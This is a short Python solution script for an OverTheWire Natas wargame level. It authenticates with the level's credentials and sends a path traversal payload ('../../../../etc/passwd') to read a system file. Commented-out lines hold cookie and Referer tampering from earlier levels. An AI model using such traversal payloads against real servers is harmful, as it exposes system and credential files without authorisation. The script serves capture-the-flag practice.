#!  usr/bin/env python
import requests
import re
username="natas7"
password="7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
# headers for http request 
# headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username
get = {"page" : "../../../../etc/passwd"}
session = requests.Session()
# cook = {"loggedin" : "1"}
# posst  = {"secret" : "FOEIUWGHFEEUHOFUOIU" , "submit" :"submit"}
# response = session.post(url , auth = (username , password),cookies = cook)
# response = session.post(url ,data = posst , auth = (username , password))
response = session.get(url , params=get,auth = (username , password))

# print session.headers

# print ("\n")

# print session.cookies
print (response.text)